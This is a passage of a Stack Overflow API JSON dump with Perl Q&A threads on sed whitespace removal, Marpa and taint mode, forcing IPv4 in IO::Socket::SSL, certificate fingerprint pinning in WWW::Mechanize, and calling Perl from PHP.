\\+&#47;&#47;; s&#47; \\+$&#47;&#47;&#39;</code>"}, {"owner": {"reputation": 226874, "user_id": 1983854, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/eKpAk.png?s=128&g=1", "display_name": "fedorqui &#39;SO stop harming&#39;", "link": "https://stackoverflow.com/users/1983854/fedorqui-so-stop-harming"}, "reply_to_user": {"reputation": 10306, "user_id": 658497, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/AiHJI.jpg?s=128&g=1", "display_name": "Noam Manos", "link": "https://stackoverflow.com/users/658497/noam-manos"}, "edited": false, "score": 1, "creation_date": 1591538919, "post_id": 33631829, "comment_id": 110088228, "body": "@NoamManos the escaping of  <code>+</code> is due to using normal Sed. You can omit it if you use extended regexp: <code>sed -r &#39;s&#47; +&#47;&#47;g&#39;</code>."}], "tags": [], "owner": {"reputation": 226874, "user_id": 1983854, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/eKpAk.png?s=128&g=1", "display_name": "fedorqui &#39;SO stop harming&#39;", "link": "https://stackoverflow.com/users/1983854/fedorqui-so-stop-harming"}, "is_accepted": true, "score": 7, "last_activity_date": 1447164402, "last_edit_date": 1447164402, "creation_date": 1447164252, "answer_id": 33631829, "question_id": 33631770, "link": "https://stackoverflow.com/questions/33631770/remove-spaces-but-keep-tabs/33631829#33631829", "title": "remove spaces, but keep tabs", "body": "<p>Just remove spaces, not <code>\\s</code> which also matches tabs:</p>\n\n<pre><code>sed 's/ \\+//g' file\n</code></pre>\n\n<p>And if you want to remove these spaces just if they occur after a tab, say:</p>\n\n<pre><code>sed 's/\\t */\\t/g' file\n</code></pre>\n\n<hr>\n\n<p>From <a href=\"http://perldoc.perl.org/perlretut.html#Using-character-classes\" rel=\"noreferrer\">perldoc perlretut</a>:</p>\n\n<blockquote>\n  <p><strong>\\s</strong> matches a whitespace character, the set [\\ \\t\\r\\n\\f] and others</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 4, "last_activity_date": 1447164863, "last_edit_date": 1447164863, "creation_date": 1447164260, "answer_id": 33631833, "question_id": 33631770, "link": "https://stackoverflow.com/questions/33631770/remove-spaces-but-keep-tabs/33631833#33631833", "title": "remove spaces, but keep tabs", "body": "<p>If it's just spaces, you can use <code>' '</code> instead of <code>\\s</code>. </p>\n\n<p>E.g. </p>\n\n<pre><code>s/ //g;\n</code></pre>\n\n<p>Of course, given you're doing <code>lape</code> and <code>-a</code> means 'autosplit on whitespace' you could just:</p>\n\n<pre><code>perl -ane 'print join (\"\\t\", @F );'\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "is_accepted": false, "score": 1, "last_activity_date": 1447169460, "creation_date": 1447169460, "answer_id": 33633615, "question_id": 33631770, "link": "https://stackoverflow.com/questions/33631770/remove-spaces-but-keep-tabs/33633615#33633615", "title": "remove spaces, but keep tabs", "body": "<p>With awk, to reformat the output to use specifically a tab character,</p>\n\n<pre><code>awk -v OFS='\\t' '{$1=$1}1' file\n</code></pre>\n\n<p>The odd-looking <code>$1=$1</code> forces awk to rewrite the current record using the Output Field Separator (tab)</p>\n"}], "owner": {"reputation": 1773, "user_id": 1987607, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/e317b170bca0054580ef85f7a6469de6?s=128&d=identicon&r=PG&f=1", "display_name": "user1987607", "link": "https://stackoverflow.com/users/1987607/user1987607"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1495, "favorite_count": 0, "accepted_answer_id": 33631829, "answer_count": 4, "score": 3, "last_activity_date": 1447169460, "creation_date": 1447164089, "question_id": 33631770, "link": "https://stackoverflow.com/questions/33631770/remove-spaces-but-keep-tabs", "title": "remove spaces, but keep tabs", "body": "<p>I have a tab-delimited text file with 3 columns.</p>\n\n<p>In some of the columns there are single or multiple spaces that I want to remove. But I want to keep the tab separation between each column and also the newline character.</p>\n\n<p>I tried </p>\n\n<pre><code>perl -lape 's/\\s+//sg\n</code></pre>\n\n<p>but that removes all whitespaces, also the tab spaces</p>\n\n<p>My file looks like this</p>\n\n<pre><code>col1 col2    col3\n1    test    test\n2       test test\n3     test    test\n</code></pre>\n\n<p>And I want</p>\n\n<pre><code>col1   col2   col3\n1      test   test\n2      test   test\n3      test   test\n</code></pre>\n\n<p>So I only want to keep the tabspaces between the different columns, but not the single spaces. I hope this is clear.</p>\n"}, {"tags": ["perl", "parsing", "taint", "marpa"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1447160042, "post_id": 33630324, "comment_id": 55034216, "body": "There are ways how to untaint data in Perl."}, {"owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1447160166, "post_id": 33630324, "comment_id": 55034277, "body": "@choroba yes by parsing it."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1447160240, "post_id": 33630324, "comment_id": 55034321, "body": "<a href=\"http://p3rl.org/perlsec#Laundering-and-Detecting-Tainted-Data\" rel=\"nofollow noreferrer\">Laundering-and-Detecting-Tainted-Data</a>. You can e.g. check the length of the input at least."}], "answers": [{"comments": [{"owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 2, "creation_date": 1447166955, "post_id": 33630693, "comment_id": 55038812, "body": "Nice article about Perl&#39;s concept of data being tainted but it does not answer my question at all. Untainting is done in the most basic way by regular expressions, which are Chomsky type-3 grammars. But sometimes this is not enough and we need a Chomsky type-2 grammar to verify the input. Now we start using parser generators. The parser generated by YACC, Bison, ANTLR, Marpa is the piece of software, which has to do the verification, if a regular expression is not enough any more. But Marpa says, it is not allowed to do so. For what is a parser generator good for, if not for untainting data?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 1, "creation_date": 1447168192, "post_id": 33630693, "comment_id": 55039787, "body": "In perl untainting is <i>only</i> by regular expression sanitisation. Granted, you can parse and <i>then</i> use a &#39;null&#39; regex to force the untaint flag. But I think you&#39;re over thinking what &quot;taint&quot; actually accomplishes - it&#39;s a safety net akin to <code>strict</code> and <code>warnings</code>. It tells you if you&#39;re using user input in a (possibly) unsafe way. But that&#39;s all."}, {"owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447168589, "post_id": 33630693, "comment_id": 55040059, "body": "The lexer of a parser does nothing more but evaluating input data against a set of regular expressions."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447168641, "post_id": 33630693, "comment_id": 55040090, "body": "Then you&#39;re already doing more than &#39;taint&#39; checking would mandate."}, {"owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447169061, "post_id": 33630693, "comment_id": 55040445, "body": "No I do exactly the same. I validate the input against a set of rules. And if the validation is successful, I accept the input as untainted. The only enhancement is, that I put the regular expressions in some kind of context expressed by the grammar. But in the end it is a regular expression which judges, which input data is accepted as untainted input."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 1, "last_activity_date": 1447276406, "last_edit_date": 1447276406, "creation_date": 1447160701, "answer_id": 33630693, "question_id": 33630324, "link": "https://stackoverflow.com/questions/33630324/is-it-possible-to-use-perls-marpa-parser-for-a-public-network-server/33630693#33630693", "title": "Is it possible to use Perl&#39;s Marpa parser for a public network server?", "body": "<p><a href=\"http://perldoc.perl.org/perlsec.html#Taint-mode\" rel=\"nofollow noreferrer\"><code>taint mode</code></a> is a perl optional setting that says - treat user input as untrusted. It stops you using any \"tainted\" variables - such as those read <em>directly</em> from <code>STDIN</code> or <code>ENV</code> in certain functions, because doing so is dangerous. </p>\n\n<p>The typical example being code injection exploits:\n<a href=\"https://i.stack.imgur.com/vcLSP.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/vcLSP.png\" alt=\"Exploits of a mom\"></a></p>\n\n<p>That's all \"taint mode\" does - it <em>enforces</em> running a sanitisation prior to using untrusted input in a risky way. </p>\n\n<p><a href=\"http://perldoc.perl.org/perlsec.html#Laundering-and-Detecting-Tainted-Data\" rel=\"nofollow noreferrer\"><em>untainting</em> is straightforward</a> - all you need do is apply a regular expression filter to your source data, such that any 'dangerous' metacharacters are excluded. (It should be noted - <code>perl</code> doesn't actually know what is 'dangerous' and what isn't - it assumes you're not being an idiot and just 'matching' everything)</p>\n\n<p>This will error:</p>\n\n<pre><code>#!/usr/bin/env perl -T\nuse strict;\nuse warnings;\n\nmy $tainted = $ENV{'USERNAME'};\nsystem ( \"echo $tainted\" );\n</code></pre>\n\n<p>Because I'm passing an <em>untrusted</em> variable through to \"system\" and it <em>might</em> have embedded code injection. </p>\n\n<blockquote>\n  <p>Insecure dependency in system while running with -T switch at</p>\n</blockquote>\n\n<p>(It might also complain about insecure path) </p>\n\n<p>So to untaint, I need to sanitise. A reasonable sanitisation would be - username must be only alphanumeric:</p>\n\n<pre><code>#!/usr/bin/env perl -T\nuse strict;\nuse warnings;\n\n$ENV{'PATH'} = '/bin'; # an untainted value \n\nmy $tainted = $ENV{'USERNAME'};\nmy ( $untainted ) = $tainted =~ m/(\\w+)/g;\nsystem ( \"echo $untainted\"); # no error now\n</code></pre>\n\n<p>And because I have used a regex - perl assumes I haven't done something boneheaded (like <code>(.*)</code>) and thus considers the data untainted. </p>\n\n<p>Why is this important? Well, it depends what your parser does. It's not uncommon for parsers - by their nature - to get 'broken' by invalid input. See the above, for example - where escaping some inline SQL bypasses validation. </p>\n\n<p>In your specific case:</p>\n\n<ul>\n<li><p>taint mode is optional. You <em>should</em> use it when you're getting untrusted input (e.g. from potentially malicious users) but it's perhaps more trouble than it's worth for your own use.</p></li>\n<li><p>Filtering HTML to validate length and character set is probably sensible. For example - checking it's an <a href=\"http://www.w3.org/TR/html-markup/syntax.html#character-encoding\" rel=\"nofollow noreferrer\">\"ascii compatible character encoding\"</a>. </p></li>\n</ul>\n\n<p>Fundamentally though I think you're overthinking what taint checking is - it's not an exhaustive validation method - it's a safety net. All it does is ensure you've done <em>some</em> basic sanitisation before passing user input to an unsafe mechanism. That's to stop ridiculous gotchas like the one I outline - most of these can be caught by a simple regex. </p>\n\n<p>If you're aware of the problem, and aren't concerned about malicious user input, then I don't think you need to be worried overly. A character whitelist will suffice, and then parse away. </p>\n"}, {"comments": [{"owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447168278, "post_id": 33631655, "comment_id": 55039852, "body": "Example: I use Marpa to implement a program adding integers. The program listens on port 90 reads two numbers and returns the sum. It is the intention of the program to expose the addition, calculated on my server, to the world. Is this doable with Marpa without any security issues? Or is it possible to attack even the most simple parser generated by Marpa, because the Marpa&#39;s parse strategy itself is attackable?"}, {"owner": {"reputation": 831, "user_id": 1679046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97a97d683b2b3040cc355862faaa908d?s=128&d=identicon&r=PG", "display_name": "Jeffrey Kegler", "link": "https://stackoverflow.com/users/1679046/jeffrey-kegler"}, "reply_to_user": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447171402, "post_id": 33631655, "comment_id": 55042171, "body": "I take it you are <i>not</i> allowing the user to generate Marpa parsers, only allowing them access to a specific one.  Yes, this can be made safe.  And, as I say, it should be safer than other parsers where you do not really know what the language you are parsing actually is."}, {"owner": {"reputation": 831, "user_id": 1679046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97a97d683b2b3040cc355862faaa908d?s=128&d=identicon&r=PG", "display_name": "Jeffrey Kegler", "link": "https://stackoverflow.com/users/1679046/jeffrey-kegler"}, "reply_to_user": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447192810, "post_id": 33631655, "comment_id": 55054899, "body": "It might be useful if I explain the final sentence quoted: &quot; In Perl&#39; s taint mode, it is a fatal error to use Marpa&#39;s SLIF interface with a tainted grammar, a tainted input string, or tainted token values.&quot;  In choosing taint strategies, I went with being fascist.  My reasoning is that if I was liberal in the taint strategy, I might be giving the user a false sense of security.  And if I was fascist, I would force them to turn taint off, which would make them aware they needed to be careful."}, {"owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447230159, "post_id": 33631655, "comment_id": 55066652, "body": "Opposing Perl&#39;s taint mode does not help. It is not the promise to be careful, which makes a program more secure. It is the certainty not having forgotten anything to check, which makes the program more secure."}, {"owner": {"reputation": 831, "user_id": 1679046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97a97d683b2b3040cc355862faaa908d?s=128&d=identicon&r=PG", "display_name": "Jeffrey Kegler", "link": "https://stackoverflow.com/users/1679046/jeffrey-kegler"}, "reply_to_user": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447254208, "post_id": 33631655, "comment_id": 55079965, "body": "I didn&#39;t think I was opposing taint mode, as much as interpreting it.  The only real alternatives to the approach I took that I can think of are 1) ignoring taintedness altogether; and 2) not allowing <i>any</i> use of Marpa when the taint flag is set.  The approach I took tries to use the taintedness feature in a way that helps the user check security.   I think it meets your criteria for making the program more secure -- it helps ensure the user has not forgotten any checks."}, {"owner": {"reputation": 831, "user_id": 1679046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97a97d683b2b3040cc355862faaa908d?s=128&d=identicon&r=PG", "display_name": "Jeffrey Kegler", "link": "https://stackoverflow.com/users/1679046/jeffrey-kegler"}, "reply_to_user": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447254653, "post_id": 33631655, "comment_id": 55080290, "body": "stackoverflow discourages comment threads from turning into what it considers &quot;discussions&quot;.  Marpa has <a href=\"https://groups.google.com/forum/?hl=en&amp;fromgroups#%21forum/marpa-parser\" rel=\"nofollow noreferrer\">a google group</a>.  More active is our IRC channel:  #marpa on irc.freenode.net.  A lot of Marpa-savvy folks hang out or lurk on the IRC channel, and I often find their input helpful."}], "tags": [], "owner": {"reputation": 831, "user_id": 1679046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97a97d683b2b3040cc355862faaa908d?s=128&d=identicon&r=PG", "display_name": "Jeffrey Kegler", "link": "https://stackoverflow.com/users/1679046/jeffrey-kegler"}, "is_accepted": true, "score": 6, "last_activity_date": 1447163768, "creation_date": 1447163768, "answer_id": 33631655, "question_id": 33630324, "link": "https://stackoverflow.com/questions/33630324/is-it-possible-to-use-perls-marpa-parser-for-a-public-network-server/33631655#33631655", "title": "Is it possible to use Perl&#39;s Marpa parser for a public network server?", "body": "<p>Marpa is actually safer than other parsers, because the language it parses is exactly that specified by the BNF.  With regexes, PEG, etc., it's very hard to determine what language is actually parsed.  In practice programmers tend to get a few test cases working and then give up.</p>\n\n<p>In particular, the parsing of unwanted inputs could be a major security issue -- with traditional parsers you usually don't know everything you are letting through.  Rarely does a test suite check to see if inputs which should be errors are in fact accepted.  Marpa parses <em>exactly</em> the language in its specification -- nothing less and nothing more.</p>\n\n<p>So why the scare language about taint mode?  Marpa, in its most general case, can be seen as a programming language, and has exactly the same security issues.  Allowing the user to execute arbitrary code is by definition insecure, and it is exactly what C, Perl, Marpa, etc. do <em>by design</em>.  You cannot give an untrusted user a general language interface.  This would be clear for C, Python, etc., but I thought someone might overlook it in the case of Marpa.  Hence the scare language.</p>\n\n<p>Marpa is IMHO more secure than competing technologies.  However, in the most general case, that is not secure enough.</p>\n"}], "owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 409, "favorite_count": 0, "accepted_answer_id": 33631655, "answer_count": 2, "score": 8, "last_activity_date": 1447276406, "creation_date": 1447159575, "question_id": 33630324, "link": "https://stackoverflow.com/questions/33630324/is-it-possible-to-use-perls-marpa-parser-for-a-public-network-server", "title": "Is it possible to use Perl&#39;s Marpa parser for a public network server?", "body": "<p>The documentation of Perl's <a href=\"http://search.cpan.org/~jkegl/Marpa-R2-3.000000/\">Marpa</a> parser contains the following section about <a href=\"http://search.cpan.org/~jkegl/Marpa-R2-3.000000/pod/Marpa_R2.pod#Tainted_data\">tainted data</a>:</p>\n\n<blockquote>\n  <p>Marpa::R2 exists to allow its input to alter execution in flexible and powerful ways. Marpa should not be used with untrusted input. In Perl' s taint mode, it is a fatal error to use Marpa's SLIF interface with a tainted grammar, a tainted input string, or tainted token values.</p>\n</blockquote>\n\n<p>I am not sure, if I understand the consequences of this limitation. I understand, that the grammar must not be tainted. But I do not understand that the input must not be tainted. For me it is the task of the parser to validate the input. It sounds unreasonable to me that a parser has to trust its input.</p>\n\n<p>Is it really that way? Is it impossible to implement any kind of public network service with Marpa?</p>\n\n<p>I ask this because one of the reference use cases is the <a href=\"https://metacpan.org/pod/Marpa::R2::HTML\">Marpa HTML parser</a> and it seems to me contradictory to use a parser for HTML, which must not be used with tainted data although about 99,99% of all HTML is possibly tainted.</p>\n\n<p>Can anybody explain this contradiction?</p>\n"}, {"tags": ["perl", "ipv6", "ipv4"], "answers": [{"comments": [{"owner": {"reputation": 315, "user_id": 1694211, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f0d96d93667ec78bccb8ea1492837a25?s=128&d=identicon&r=PG", "display_name": "Marcus", "link": "https://stackoverflow.com/users/1694211/marcus"}, "edited": false, "score": 0, "creation_date": 1447226383, "post_id": 33632522, "comment_id": 55065137, "body": "Thanks, the Domain=&gt;AF_INET part was what I was looking for"}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": true, "score": 1, "last_activity_date": 1447166274, "creation_date": 1447166274, "answer_id": 33632522, "question_id": 33629446, "link": "https://stackoverflow.com/questions/33629446/perl-per-socket-restriction-of-iosocketssl-to-ipv4/33632522#33632522", "title": "Perl: per-socket restriction of IO::Socket::SSL to IPv4", "body": "<p>If you're looping over each system, this (untested) code should do what you want. If you have multiple v4 servers, you can put them all into an array, then instead of doing an <code>eq</code> for a single name, use <code>grep</code> instead.</p>\n\n<pre><code>for (@servers){\n\n    my %params = (\n        Proto       =&gt; $proto,\n        PeerAddr    =&gt; $_,\n        PeerPort    =&gt; $port,\n        ...\n    );\n\n    my $sock;\n\n    if ($_ eq 'ipv4_servername'){\n        $sock = IO::Socket::SSL-&gt;new(%params, Domain =&gt; AF_INET);\n    }\n    else {\n        $sock = IO::Socket::SSL-&gt;new(%params);\n    }\n    ...\n}\n</code></pre>\n"}], "owner": {"reputation": 315, "user_id": 1694211, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f0d96d93667ec78bccb8ea1492837a25?s=128&d=identicon&r=PG", "display_name": "Marcus", "link": "https://stackoverflow.com/users/1694211/marcus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 193, "favorite_count": 0, "accepted_answer_id": 33632522, "answer_count": 1, "score": 0, "last_activity_date": 1447166274, "creation_date": 1447156606, "last_edit_date": 1447164538, "question_id": 33629446, "link": "https://stackoverflow.com/questions/33629446/perl-per-socket-restriction-of-iosocketssl-to-ipv4", "title": "Perl: per-socket restriction of IO::Socket::SSL to IPv4", "body": "<p>I use IO:Socket::SSL to connect to a number of upstream sources. There is an IPv6 connectivity issue with one of the sources which I want to circumvent by using IPv4 for the time being. To do so, I have used the IPv4 address in my conf file instead of the hostnname. However, I would prefer using the hostname and an additional option to force IPv4 for this source.</p>\n\n<p>Now I am unsure what option to use with IO::Socket::SSL. Perldoc reads \"you can either force IPv4 by specifying and AF_INET as theDomain\" which seems a bit garbled.</p>\n\n<p>I'd appreciate if someone could provide an example how to do that. To clarify, I would not like to use IO::Socket::SSL qw (inet) as other connections shan't be affected.</p>\n\n<p>Best,\nMarcus</p>\n"}, {"tags": ["perl", "ssl", "mechanize", "www-mechanize"], "answers": [{"tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": true, "score": 1, "last_activity_date": 1447175329, "creation_date": 1447175329, "answer_id": 33635616, "question_id": 33626926, "link": "https://stackoverflow.com/questions/33626926/https-and-wwwmechanize-accept-specific-certificate-md5-sha1/33635616#33635616", "title": "https and WWW::Mechanize - accept specific certificate (MD5/SHA1/...)", "body": "<p>WWW::Mechanize is a subclass of LWP::UserAgent which itself uses IO::Socket::SSL to make the SSL connections. IO::Socket::SSL offers an option <code>SSL_fingerprint</code> which can be used to specify the expected fingerprint of the certificate. Please see <a href=\"https://metacpan.org/pod/IO::Socket::SSL\" rel=\"nofollow\">the documentation</a> for more details but a short example:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse WWW::Mechanize;\n\nmy %sslargs = (\n    SSL_fingerprint =&gt; 'sha256$a0b0d7c3d86a03051af6a43726a0dd855825323cae59fdff2d9b9a8db83934b8',\n);\n\nmy $ua = WWW::Mechanize-&gt;new( ssl_opts =&gt; \\%sslargs);\nmy $resp = $ua-&gt;get(\"https://www.example.com\");\n</code></pre>\n\n<p>Note that you need at least IO::Socket::SSL version 1.980 (released 04/2014) for proper support of SSL_fingerprint and that you should also use fairly recent versions of LWP.</p>\n\n<p>When using SSL_fingerprint all other checks are ignored as long as the fingerprint matches, that is you can use self-signed certificates, expired certificates or certificates with the wrong subject.</p>\n"}], "owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 246, "favorite_count": 0, "accepted_answer_id": 33635616, "answer_count": 1, "score": -1, "last_activity_date": 1604492721, "creation_date": 1447148409, "last_edit_date": 1604492721, "question_id": 33626926, "link": "https://stackoverflow.com/questions/33626926/https-and-wwwmechanize-accept-specific-certificate-md5-sha1", "title": "https and WWW::Mechanize - accept specific certificate (MD5/SHA1/...)", "body": "<p>How to make WWW::Mechanize accept specific SSL certificate for https server?<br>\n[SSL certificate should be validated by MD5/SHA1/... checksum ]</p>\n\n<p>Background:<br>\nSo far I need a hack to accept expired (a few days so far) SSL certificate [replace standard set of checks]. I would like also to be able to add SSL checksum check as <strong>additional</strong> check in future.</p>\n"}, {"tags": ["php", "perl", "shell"], "comments": [{"owner": {"reputation": 8597, "user_id": 1039481, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a10ec3de7bec751e1633eba0ef28d4cb?s=128&d=identicon&r=PG", "display_name": "Akhil Thayyil", "link": "https://stackoverflow.com/users/1039481/akhil-thayyil"}, "edited": false, "score": 1, "creation_date": 1447143479, "post_id": 33625448, "comment_id": 55024725, "body": "Any errors ? Tried running /usr/bin/perl /var/www/html/perl/test.pl 1 2 from shell ?"}, {"owner": {"reputation": 12374, "user_id": 1398445, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/76aaee1680ca471d1b9b5f6c3b0456bc?s=128&d=identicon&r=PG", "display_name": "Amarnasan", "link": "https://stackoverflow.com/users/1398445/amarnasan"}, "edited": false, "score": 0, "creation_date": 1447143576, "post_id": 33625448, "comment_id": 55024788, "body": "Is it run from console or server? If from server: does the user running the server have the privilege to run that file? If from command line: does your user have the privilege?"}, {"owner": {"reputation": 11741, "user_id": 1934428, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/072774c5d4204a1c2385560e6114a887?s=128&d=identicon&r=PG", "display_name": "user1934428", "link": "https://stackoverflow.com/users/1934428/user1934428"}, "edited": false, "score": 0, "creation_date": 1447145948, "post_id": 33625448, "comment_id": 55026097, "body": "What is the output of your <code>var_dump($output)</code>?"}, {"owner": {"reputation": 1, "user_id": 5545616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1aaa46ad7cfd01dab641a1c1e13c86d3?s=128&d=identicon&r=PG&f=1", "display_name": "Devid", "link": "https://stackoverflow.com/users/5545616/devid"}, "edited": false, "score": 0, "creation_date": 1447154886, "post_id": 33625448, "comment_id": 55031333, "body": "1) Runs in console server 2) Script it works from shell 3) The result of var_dump is &quot;&quot;."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 5545616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1aaa46ad7cfd01dab641a1c1e13c86d3?s=128&d=identicon&r=PG&f=1", "display_name": "Devid", "link": "https://stackoverflow.com/users/5545616/devid"}, "edited": false, "score": 0, "creation_date": 1447167376, "post_id": 33625637, "comment_id": 55039136, "body": "I&#39;m using PHP Version 5.6.14. In php.ini I hasn&#39;t found safe_mode directive, maybe it&#39;s deprecated in this version."}], "tags": [], "owner": {"reputation": 48, "user_id": 4353536, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cca6f2b673c447cee343124d240292e5?s=128&d=identicon&r=PG&f=1", "display_name": "Silvester Kokai", "link": "https://stackoverflow.com/users/4353536/silvester-kokai"}, "is_accepted": false, "score": 0, "last_activity_date": 1447143981, "creation_date": 1447143981, "answer_id": 33625637, "question_id": 33625448, "link": 